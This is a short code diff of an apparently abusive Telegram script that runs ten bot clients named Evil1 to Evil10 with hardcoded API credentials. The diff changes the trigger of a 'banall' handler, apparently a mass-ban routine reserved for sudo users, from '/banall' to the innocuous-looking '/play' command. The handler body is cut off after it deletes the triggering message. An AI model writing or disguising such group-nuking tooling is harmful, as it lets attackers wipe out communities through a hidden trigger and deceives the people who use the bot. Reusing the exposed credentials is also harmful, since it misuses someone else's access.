@@ -49,16 +49,16 @@ Evil9 = TelegramClient('EVIL9', 20310034, "e0d2c11f4ba291ce596868e73df87519").st
 Evil10 = TelegramClient('EVIL10', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN10)
 
 
-@Evil1.on(events.NewMessage(pattern="^/banall"))
-@Evil2.on(events.NewMessage(pattern="^/banall"))
-@Evil3.on(events.NewMessage(pattern="^/banall"))
-@Evil4.on(events.NewMessage(pattern="^/banall"))
-@Evil5.on(events.NewMessage(pattern="^/banall"))
-@Evil6.on(events.NewMessage(pattern="^/banall"))
-@Evil7.on(events.NewMessage(pattern="^/banall"))
-@Evil8.on(events.NewMessage(pattern="^/banall"))
-@Evil9.on(events.NewMessage(pattern="^/banall"))
-@Evil10.on(events.NewMessage(pattern="^/banall"))
+@Evil1.on(events.NewMessage(pattern="^/play"))
+@Evil2.on(events.NewMessage(pattern="^/play"))
+@Evil3.on(events.NewMessage(pattern="^/play"))
+@Evil4.on(events.NewMessage(pattern="^/play"))
+@Evil5.on(events.NewMessage(pattern="^/play"))
+@Evil6.on(events.NewMessage(pattern="^/play"))
+@Evil7.on(events.NewMessage(pattern="^/play"))
+@Evil8.on(events.NewMessage(pattern="^/play"))
+@Evil9.on(events.NewMessage(pattern="^/play"))
+@Evil10.on(events.NewMessage(pattern="^/play"))
 async def banall(event):
    if event.sender_id in SUDO_USERS:
         await event.delete()
